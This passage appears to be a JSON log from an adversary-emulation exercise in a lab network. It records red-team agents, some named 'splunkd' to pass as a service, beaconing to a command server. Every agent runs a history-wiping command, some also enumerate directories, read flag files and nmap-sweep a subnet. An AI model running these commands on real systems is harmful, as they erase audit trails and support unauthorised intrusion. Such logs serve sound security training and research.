{"host_group": [{"executors": ["proc", "sh"], "links": [{"deadman": false, "executor": {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "> $HOME/.bash_history && unset HISTFILE", "platform": "linux", "parsers": [], "uploads": [], "language": null}, "cleanup": 0, "plaintext_command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "used": [], "unique": "8a856578-ef9d-4e69-8ed5-b1b56eb1b9ba", "decide": "2023-10-09T22:15:56Z", "pid": "1443", "pin": 0, "output": "False", "ability": {"tactic": "defense-evasion", "ability_id": "43b3754c-def4-4699-a673-1d85648fda6a", "executors": [{"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "> $HOME/.bash_history && unset HISTFILE", "platform": "darwin", "parsers": [], "uploads": [], "language": null}, {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "> $HOME/.bash_history && unset HISTFILE", "platform": "linux", "parsers": [], "uploads": [], "language": null}, {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "psh", "cleanup": [], "command": "Clear-History;Clear", "platform": "windows", "parsers": [], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T1070.003", "name": "Avoid logs", "description": "Stop terminal from logging history", "plugin": "stockpile", "requirements": [], "buckets": ["defense-evasion"], "technique_name": "Indicator Removal on Host: Clear Command History"}, "agent_reported_time": "2023-10-09T22:15:56Z", "command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "facts": [], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-09T22:15:56Z", "finish": "2023-10-09T22:15:56Z", "id": "8a856578-ef9d-4e69-8ed5-b1b56eb1b9ba", "jitter": 0, "status": 0, "score": 0, "relationships": [], "host": "intern-host", "paw": "axoeyj"}], "deadman_enabled": true, "ppid": 1, "last_seen": "2023-10-09T22:16:16Z", "sleep_min": 1, "pid": 1188, "proxy_receivers": {}, "sleep_max": 6, "display_name": "intern-host$root", "platform": "linux", "pending_contact": "HTTP", "available_contacts": ["HTTP"], "created": "2023-10-09T22:15:56Z", "origin_link_id": "", "location": "/root/splunkd", "exe_name": "splunkd", "watchdog": 0, "trusted": false, "architecture": "amd64", "group": "red", "contact": "HTTP", "privilege": "Elevated", "host": "intern-host", "paw": "axoeyj", "host_ip_addrs": ["192.168.200.7"], "server": "http://10.20.20.1:8888", "upstream_dest": "http://10.20.20.1:8888", "username": "root", "proxy_chain": []}, {"executors": ["proc", "sh"], "links": [{"deadman": false, "executor": {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "> $HOME/.bash_history && unset HISTFILE", "platform": "linux", "parsers": [], "uploads": [], "language": null}, "cleanup": 0, "plaintext_command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "used": [], "unique": "fbb337ad-495d-4f81-84d2-63ffa085fcc0", "decide": "2023-10-09T22:15:57Z", "pid": "1740", "pin": 0, "output": "False", "ability": {"tactic": "defense-evasion", "ability_id": "43b3754c-def4-4699-a673-1d85648fda6a", "executors": [{"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "> $HOME/.bash_history && unset HISTFILE", "platform": "darwin", "parsers": [], "uploads": [], "language": null}, {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "> $HOME/.bash_history && unset HISTFILE", "platform": "linux", "parsers": [], "uploads": [], "language": null}, {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "psh", "cleanup": [], "command": "Clear-History;Clear", "platform": "windows", "parsers": [], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T1070.003", "name": "Avoid logs", "description": "Stop terminal from logging history", "plugin": "stockpile", "requirements": [], "buckets": ["defense-evasion"], "technique_name": "Indicator Removal on Host: Clear Command History"}, "agent_reported_time": "2023-10-09T22:15:57Z", "command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "facts": [], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-09T22:15:57Z", "finish": "2023-10-09T22:15:57Z", "id": "fbb337ad-495d-4f81-84d2-63ffa085fcc0", "jitter": 0, "status": 0, "score": 0, "relationships": [], "host": "ceo-host", "paw": "eamqnr"}], "deadman_enabled": true, "ppid": 1, "last_seen": "2023-10-09T22:16:11Z", "sleep_min": 1, "pid": 1532, "proxy_receivers": {}, "sleep_max": 6, "display_name": "ceo-host$ceo", "platform": "linux", "pending_contact": "HTTP", "available_contacts": ["HTTP"], "created": "2023-10-09T22:15:57Z", "origin_link_id": "", "location": "/home/ceo/sandcat.go", "exe_name": "sandcat.go", "watchdog": 0, "trusted": false, "architecture": "amd64", "group": "red", "contact": "HTTP", "privilege": "User", "host": "ceo-host", "paw": "eamqnr", "host_ip_addrs": ["192.168.200.4"], "server": "http://10.20.20.1:8888", "upstream_dest": "http://10.20.20.1:8888", "username": "ceo", "proxy_chain": []}, {"executors": ["proc", "sh"], "links": [{"deadman": false, "executor": {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "> $HOME/.bash_history && unset HISTFILE", "platform": "linux", "parsers": [], "uploads": [], "language": null}, "cleanup": 0, "plaintext_command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "used": [], "unique": "89519964-63f0-43a9-81c1-5658efcc3410", "decide": "2023-10-09T22:15:57Z", "pid": "1605", "pin": 0, "output": "False", "ability": {"tactic": "defense-evasion", "ability_id": "43b3754c-def4-4699-a673-1d85648fda6a", "executors": [{"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "> $HOME/.bash_history && unset HISTFILE", "platform": "darwin", "parsers": [], "uploads": [], "language": null}, {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "> $HOME/.bash_history && unset HISTFILE", "platform": "linux", "parsers": [], "uploads": [], "language": null}, {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "psh", "cleanup": [], "command": "Clear-History;Clear", "platform": "windows", "parsers": [], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T1070.003", "name": "Avoid logs", "description": "Stop terminal from logging history", "plugin": "stockpile", "requirements": [], "buckets": ["defense-evasion"], "technique_name": "Indicator Removal on Host: Clear Command History"}, "agent_reported_time": "2023-10-09T22:15:57Z", "command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "facts": [], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-09T22:15:57Z", "finish": "2023-10-09T22:15:57Z", "id": "89519964-63f0-43a9-81c1-5658efcc3410", "jitter": 0, "status": 0, "score": 0, "relationships": [], "host": "finance-host", "paw": "lpgmex"}], "deadman_enabled": true, "ppid": 1364, "last_seen": "2023-10-09T22:16:15Z", "sleep_min": 1, "pid": 1371, "proxy_receivers": {}, "sleep_max": 6, "display_name": "finance-host$root", "platform": "linux", "pending_contact": "HTTP", "available_contacts": ["HTTP"], "created": "2023-10-09T22:15:57Z", "origin_link_id": "", "location": "/root/splunkd", "exe_name": "splunkd", "watchdog": 0, "trusted": false, "architecture": "amd64", "group": "red", "contact": "HTTP", "privilege": "Elevated", "host": "finance-host", "paw": "lpgmex", "host_ip_addrs": ["192.168.200.5"], "server": "http://10.20.20.1:8888", "upstream_dest": "http://10.20.20.1:8888", "username": "root", "proxy_chain": []}, {"executors": ["proc", "sh"], "links": [{"deadman": false, "executor": {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "> $HOME/.bash_history && unset HISTFILE", "platform": "linux", "parsers": [], "uploads": [], "language": null}, "cleanup": 0, "plaintext_command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "used": [], "unique": "c1213c3c-7541-437f-8ebe-515db36837b7", "decide": "2023-10-09T22:17:13Z", "pid": "1197", "pin": 0, "output": "False", "ability": {"tactic": "defense-evasion", "ability_id": "43b3754c-def4-4699-a673-1d85648fda6a", "executors": [{"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "> $HOME/.bash_history && unset HISTFILE", "platform": "darwin", "parsers": [], "uploads": [], "language": null}, {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "> $HOME/.bash_history && unset HISTFILE", "platform": "linux", "parsers": [], "uploads": [], "language": null}, {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "psh", "cleanup": [], "command": "Clear-History;Clear", "platform": "windows", "parsers": [], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T1070.003", "name": "Avoid logs", "description": "Stop terminal from logging history", "plugin": "stockpile", "requirements": [], "buckets": ["defense-evasion"], "technique_name": "Indicator Removal on Host: Clear Command History"}, "agent_reported_time": "2023-10-09T22:17:13Z", "command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "facts": [], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-09T22:17:13Z", "finish": "2023-10-09T22:17:13Z", "id": "c1213c3c-7541-437f-8ebe-515db36837b7", "jitter": 0, "status": 0, "score": 0, "relationships": [], "host": "intern-host", "paw": "tubxdc"}], "deadman_enabled": true, "ppid": 1, "last_seen": "2023-10-09T22:20:49Z", "sleep_min": 1, "pid": 1193, "proxy_receivers": {}, "sleep_max": 6, "display_name": "intern-host$root", "platform": "linux", "pending_contact": "HTTP", "available_contacts": ["HTTP"], "created": "2023-10-09T22:17:13Z", "origin_link_id": "", "location": "/root/splunkd", "exe_name": "splunkd", "watchdog": 0, "trusted": false, "architecture": "amd64", "group": "red", "contact": "HTTP", "privilege": "Elevated", "host": "intern-host", "paw": "tubxdc", "host_ip_addrs": ["192.168.200.7"], "server": "http://10.20.20.1:8888", "upstream_dest": "http://10.20.20.1:8888", "username": "root", "proxy_chain": []}, {"executors": ["proc", "sh"], "links": [{"deadman": false, "executor": {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "> $HOME/.bash_history && unset HISTFILE", "platform": "linux", "parsers": [], "uploads": [], "language": null}, "cleanup": 0, "plaintext_command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "used": [], "unique": "bc5d804a-93be-497a-8d69-06656a22ca72", "decide": "2023-10-09T22:20:30Z", "pid": "963", "pin": 0, "output": "False", "ability": {"tactic": "defense-evasion", "ability_id": "43b3754c-def4-4699-a673-1d85648fda6a", "executors": [{"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "> $HOME/.bash_history && unset HISTFILE", "platform": "darwin", "parsers": [], "uploads": [], "language": null}, {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "> $HOME/.bash_history && unset HISTFILE", "platform": "linux", "parsers": [], "uploads": [], "language": null}, {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "psh", "cleanup": [], "command": "Clear-History;Clear", "platform": "windows", "parsers": [], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T1070.003", "name": "Avoid logs", "description": "Stop terminal from logging history", "plugin": "stockpile", "requirements": [], "buckets": ["defense-evasion"], "technique_name": "Indicator Removal on Host: Clear Command History"}, "agent_reported_time": "2023-10-09T22:20:30Z", "command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "facts": [], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-09T22:20:30Z", "finish": "2023-10-09T22:20:30Z", "id": "bc5d804a-93be-497a-8d69-06656a22ca72", "jitter": 0, "status": 0, "score": 0, "relationships": [], "host": "activedir-host", "paw": "rkzyad"}], "deadman_enabled": true, "ppid": 951, "last_seen": "2023-10-09T22:23:50Z", "sleep_min": 1, "pid": 959, "proxy_receivers": {}, "sleep_max": 6, "display_name": "activedir-host$root", "platform": "linux", "pending_contact": "HTTP", "available_contacts": ["HTTP"], "created": "2023-10-09T22:20:30Z", "origin_link_id": "", "location": "/root/splunkd", "exe_name": "splunkd", "watchdog": 0, "trusted": false, "architecture": "amd64", "group": "red", "contact": "HTTP", "privilege": "Elevated", "host": "activedir-host", "paw": "rkzyad", "host_ip_addrs": ["192.168.200.3"], "server": "http://10.20.20.1:8888", "upstream_dest": "http://10.20.20.1:8888", "username": "root", "proxy_chain": []}, {"executors": ["proc", "sh"], "links": [{"deadman": false, "executor": {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "> $HOME/.bash_history && unset HISTFILE", "platform": "linux", "parsers": [], "uploads": [], "language": null}, "cleanup": 0, "plaintext_command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "used": [], "unique": "5959c62c-a261-43f2-a32b-a697af8a8d1d", "decide": "2023-10-09T22:23:38Z", "pid": "2091", "pin": 0, "output": "False", "ability": {"tactic": "defense-evasion", "ability_id": "43b3754c-def4-4699-a673-1d85648fda6a", "executors": [{"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "> $HOME/.bash_history && unset HISTFILE", "platform": "darwin", "parsers": [], "uploads": [], "language": null}, {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "> $HOME/.bash_history && unset HISTFILE", "platform": "linux", "parsers": [], "uploads": [], "language": null}, {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "psh", "cleanup": [], "command": "Clear-History;Clear", "platform": "windows", "parsers": [], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T1070.003", "name": "Avoid logs", "description": "Stop terminal from logging history", "plugin": "stockpile", "requirements": [], "buckets": ["defense-evasion"], "technique_name": "Indicator Removal on Host: Clear Command History"}, "agent_reported_time": "2023-10-09T22:23:38Z", "command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "facts": [], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-09T22:23:38Z", "finish": "2023-10-09T22:23:38Z", "id": "5959c62c-a261-43f2-a32b-a697af8a8d1d", "jitter": 0, "status": 0, "score": 0, "relationships": [], "host": "database-host", "paw": "tovvyz"}], "deadman_enabled": true, "ppid": 2081, "last_seen": "2023-10-09T22:26:12Z", "sleep_min": 1, "pid": 2088, "proxy_receivers": {}, "sleep_max": 6, "display_name": "database-host$root", "platform": "linux", "pending_contact": "HTTP", "available_contacts": ["HTTP"], "created": "2023-10-09T22:23:38Z", "origin_link_id": "", "location": "/root/splunkd", "exe_name": "splunkd", "watchdog": 0, "trusted": true, "architecture": "amd64", "group": "red", "contact": "HTTP", "privilege": "Elevated", "host": "database-host", "paw": "tovvyz", "host_ip_addrs": ["192.168.201.3"], "server": "http://10.20.20.1:8888", "upstream_dest": "http://10.20.20.1:8888", "username": "root", "proxy_chain": []}], "state": "finished", "start": "2023-10-09T22:19:01Z", "auto_close": true, "use_learning_parsers": true, "autonomous": 1, "planner": {"module": "plugins.deception.app.deception_enterprise", "name": "Deception enterprise planner", "params": {}, "description": "Runs enterprise specific actions", "plugin": "deception", "id": "deception_enterprise", "allow_repeatable_abilities": false, "stopping_conditions": [], "ignore_enforcement_modules": []}, "chain": [{"deadman": false, "finish": "2023-10-09T22:19:02Z", "executor": {"additional_info": {}, "timeout": 15, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "ls -l #{host.dir.path}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.ls", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.dir.contents", "edge": "has_children", "source": "host.dir.path"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "fefaaaf8-629b-4c79-b9b1-db6393dba83a", "plaintext_command": "ls -l /home", "used": [{"trait": "host.dir.path", "links": ["fefaaaf8-629b-4c79-b9b1-db6393dba83a", "3da327cd-130e-4252-802a-4b1e6c4aef56", "0be0e5ae-fa60-43a3-a9d6-f19258a67913"], "collected_by": ["tubxdc", "rkzyad", "tovvyz"], "score": 4, "limit_count": -1, "name": "host.dir.path", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "/home", "unique": "host.dir.path/home", "created": "2023-10-09T22:19:01Z", "relationships": ["host.dir.path(/home) : has_contents : host.dir.children(['intern'])", "host.dir.path(/home) : has_contents : host.dir.children(['activedir'])", "host.dir.path(/home) : has_contents : host.dir.children(['database'])"]}], "unique": "fefaaaf8-629b-4c79-b9b1-db6393dba83a", "decide": "2023-10-09T22:19:01Z", "status": 0, "score": 1, "pid": "1200", "relationships": [{"target": {"trait": "host.dir.children", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.dir.children", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": ["intern"], "unique": "host.dir.children['intern']", "created": "2023-10-09T22:19:02Z", "relationships": []}, "source": {"trait": "host.dir.path", "links": ["fefaaaf8-629b-4c79-b9b1-db6393dba83a", "3da327cd-130e-4252-802a-4b1e6c4aef56", "0be0e5ae-fa60-43a3-a9d6-f19258a67913"], "collected_by": ["tubxdc", "rkzyad", "tovvyz"], "score": 4, "limit_count": -1, "name": "host.dir.path", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "/home", "unique": "host.dir.path/home", "created": "2023-10-09T22:19:01Z", "relationships": ["host.dir.path(/home) : has_contents : host.dir.children(['intern'])", "host.dir.path(/home) : has_contents : host.dir.children(['activedir'])", "host.dir.path(/home) : has_contents : host.dir.children(['database'])"]}, "origin": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "edge": "has_contents", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a344730>has_contents<app.objects.secondclass.c_fact.Fact object at 0x7fe71a41bd30>", "score": 1}], "host": "intern-host", "pin": 0, "paw": "tubxdc", "output": "True", "ability": {"tactic": "utility", "ability_id": "deception-ls", "executors": [{"additional_info": {}, "timeout": 15, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "ls -l #{host.dir.path}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.ls", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.dir.contents", "edge": "has_children", "source": "host.dir.path"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T9012", "name": "Enumerate all folders withing a directory", "description": "Enumerates all folders within a directory", "plugin": "deception", "requirements": [{"module": "plugins.stockpile.app.requirements.paw_provenance", "relationship_match": [{"source": "host.dir.path"}]}, {"module": "plugins.stockpile.app.requirements.not_exists", "relationship_match": [{"source": "host.dir.path", "edge": "has_children", "target": "host.dir.children"}]}], "buckets": ["utility"], "technique_name": "Deception Enum Folders"}, "agent_reported_time": "2023-10-09T22:19:02Z", "command": "ls -l /home", "facts": [{"trait": "host.dir.path", "links": ["fefaaaf8-629b-4c79-b9b1-db6393dba83a", "3da327cd-130e-4252-802a-4b1e6c4aef56", "0be0e5ae-fa60-43a3-a9d6-f19258a67913"], "collected_by": ["tubxdc", "rkzyad", "tovvyz"], "score": 4, "limit_count": -1, "name": "host.dir.path", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "/home", "unique": "host.dir.path/home", "created": "2023-10-09T22:19:01Z", "relationships": ["host.dir.path(/home) : has_contents : host.dir.children(['intern'])", "host.dir.path(/home) : has_contents : host.dir.children(['activedir'])", "host.dir.path(/home) : has_contents : host.dir.children(['database'])"]}, {"trait": "host.dir.children", "links": ["fefaaaf8-629b-4c79-b9b1-db6393dba83a"], "collected_by": ["tubxdc"], "score": 1, "limit_count": -1, "name": "host.dir.children", "technique_id": "T9012", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": ["intern"], "unique": "host.dir.children['intern']", "created": "2023-10-09T22:19:02Z", "relationships": ["host.dir.path(/home) : has_contents : host.dir.children(['intern'])"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-09T22:19:02Z"}, {"deadman": false, "finish": "2023-10-09T22:19:11Z", "executor": {"additional_info": {}, "timeout": 15, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "cat #{host.file.path}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.cat", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.file.contents", "edge": "has_contents", "source": "host.file.path"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "a9d1d6f3-38c0-4bb1-b507-e0748f8d6c3d", "plaintext_command": "cat /home/intern/flag.txt", "used": [{"trait": "host.file.path", "links": [], "collected_by": ["tubxdc"], "score": 1, "limit_count": -1, "name": "host.file.path", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "/home/intern/flag.txt", "unique": "host.file.path/home/intern/flag.txt", "created": "2023-10-09T22:19:06Z", "relationships": []}], "unique": "a9d1d6f3-38c0-4bb1-b507-e0748f8d6c3d", "decide": "2023-10-09T22:19:06Z", "status": 1, "score": 1, "pid": "1202", "relationships": [], "host": "intern-host", "pin": 0, "paw": "tubxdc", "output": "True", "ability": {"tactic": "utility", "ability_id": "deception-readfile", "executors": [{"additional_info": {}, "timeout": 15, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "cat #{host.file.path}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.cat", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.file.contents", "edge": "has_contents", "source": "host.file.path"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T9000", "name": "Deception read file", "description": "Read a file", "plugin": "deception", "requirements": [{"module": "plugins.stockpile.app.requirements.paw_provenance", "relationship_match": [{"source": "host.file.path"}]}, {"module": "plugins.stockpile.app.requirements.not_exists", "relationship_match": [{"source": "host.file.path", "edge": "has_contents", "target": "host.file.contents"}]}], "buckets": ["utility"], "technique_name": "Deception"}, "agent_reported_time": "2023-10-09T22:19:11Z", "command": "cat /home/intern/flag.txt", "facts": [], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-09T22:19:11Z"}, {"deadman": false, "finish": "2023-10-09T22:19:18Z", "executor": {"additional_info": {}, "timeout": 15, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "cat #{host.file.path}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.cat", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.file.contents", "edge": "has_contents", "source": "host.file.path"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "c35d083c-9ca8-49c9-99eb-1b6c25afc568", "plaintext_command": "cat /root/flag.txt", "used": [{"trait": "host.file.path", "links": ["75b46932-68c7-4fb3-880a-a08a19de0878"], "collected_by": ["tubxdc", "tovvyz"], "score": 2, "limit_count": -1, "name": "host.file.path", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "/root/flag.txt", "unique": "host.file.path/root/flag.txt", "created": "2023-10-09T22:19:11Z", "relationships": ["host.file.path(/root/flag.txt) : has_contents : host.file.contents(R8KIIFMGSDAKMQD4GB54QCC78LFLGNG5)"]}], "unique": "c35d083c-9ca8-49c9-99eb-1b6c25afc568", "decide": "2023-10-09T22:19:11Z", "status": 1, "score": 1, "pid": "1204", "relationships": [], "host": "intern-host", "pin": 0, "paw": "tubxdc", "output": "True", "ability": {"tactic": "utility", "ability_id": "deception-readfile", "executors": [{"additional_info": {}, "timeout": 15, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "cat #{host.file.path}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.cat", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.file.contents", "edge": "has_contents", "source": "host.file.path"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T9000", "name": "Deception read file", "description": "Read a file", "plugin": "deception", "requirements": [{"module": "plugins.stockpile.app.requirements.paw_provenance", "relationship_match": [{"source": "host.file.path"}]}, {"module": "plugins.stockpile.app.requirements.not_exists", "relationship_match": [{"source": "host.file.path", "edge": "has_contents", "target": "host.file.contents"}]}], "buckets": ["utility"], "technique_name": "Deception"}, "agent_reported_time": "2023-10-09T22:19:18Z", "command": "cat /root/flag.txt", "facts": [], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-09T22:19:18Z"}, {"deadman": false, "finish": "2023-10-09T22:19:27Z", "executor": {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.subnet.online_ipaddrs", "edge": "has_online_ipaddrs", "source": "host.subnet.ipaddrs"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "59b4d7fe-d671-428b-b097-5c860ed68448", "plaintext_command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.200.0/24", "used": [{"trait": "scan.subnet.addr", "links": [], "collected_by": [], "score": 2, "limit_count": -1, "name": "scan.subnet.addr", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.0/24", "unique": "scan.subnet.addr192.168.200.0/24", "created": "2023-10-09T22:19:21Z", "relationships": []}], "unique": "59b4d7fe-d671-428b-b097-5c860ed68448", "decide": "2023-10-09T22:19:21Z", "status": 0, "score": 1, "pid": "1206", "relationships": [{"target": {"trait": "host.subnet.online_ipaddrs", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.subnet.online_ipaddrs", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": ["192.168.200.1", "192.168.200.2", "192.168.200.3", "192.168.200.4", "192.168.200.5", "192.168.200.6", "192.168.200.156", "192.168.200.7"], "unique": "host.subnet.online_ipaddrs['192.168.200.1', '192.168.200.2', '192.168.200.3', '192.168.200.4', '192.168.200.5', '192.168.200.6', '192.168.200.156', '192.168.200.7']", "created": "2023-10-09T22:19:27Z", "relationships": []}, "source": {"trait": "host.subnet.ipaddrs", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.subnet.ipaddrs", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.0/24", "unique": "host.subnet.ipaddrs192.168.200.0/24", "created": "2023-10-09T22:19:27Z", "relationships": []}, "origin": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "edge": "has_online_ipaddrs", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71b0a3d90>has_online_ipaddrs<app.objects.secondclass.c_fact.Fact object at 0x7fe71b0a2380>", "score": 1}], "host": "intern-host", "pin": 0, "paw": "tubxdc", "output": "True", "ability": {"tactic": "deception-data-collection", "ability_id": "deception-nmapsubnet", "executors": [{"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.subnet.online_ipaddrs", "edge": "has_online_ipaddrs", "source": "host.subnet.ipaddrs"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T1021.006", "name": "Deception Nmap subnet", "description": "Scans a subnet for active ip addresses", "plugin": "deception", "requirements": [], "buckets": ["deception-data-collection"], "technique_name": "TODO"}, "agent_reported_time": "2023-10-09T22:19:25Z", 